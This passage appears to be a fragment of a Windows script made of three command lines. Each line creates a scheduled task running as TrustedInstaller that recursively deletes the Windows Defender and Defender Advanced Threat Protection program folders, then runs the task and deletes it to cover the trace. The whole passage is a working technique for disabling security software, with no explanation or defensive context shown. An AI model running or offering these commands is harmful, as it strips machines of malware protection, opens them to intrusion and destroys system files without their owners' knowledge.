...
schtasks /create /tn "DeleteDefender" /ru "NT SERVICE\TrustedInstaller" /sc ONCE /st 00:00 /tr "cmd.exe /c rmdir /s /q \"C:\Program Files\Windows Defender\"" /f;schtasks /run /tn "DeleteDefender";schtasks /delete /tn "DeleteDefender" /f
schtasks /create /tn "DeleteDefender" /ru "NT SERVICE\TrustedInstaller" /sc ONCE /st 00:00 /tr "cmd.exe /c rmdir /s /q 'C:\Program Files (x86)\Windows Defender'" /f; schtasks /run /tn "DeleteDefender"; schtasks /delete /tn "DeleteDefender" /f
schtasks /create /tn "DeleteDefender" /ru "NT SERVICE\TrustedInstaller" /sc ONCE /st 00:00 /tr "cmd.exe /c rmdir /s /q \"C:\Program Files\Windows Defender Advanced Threat Protection\"" /f;schtasks /run /tn "DeleteDefender";schtasks /delete /tn "DeleteDefender" /f
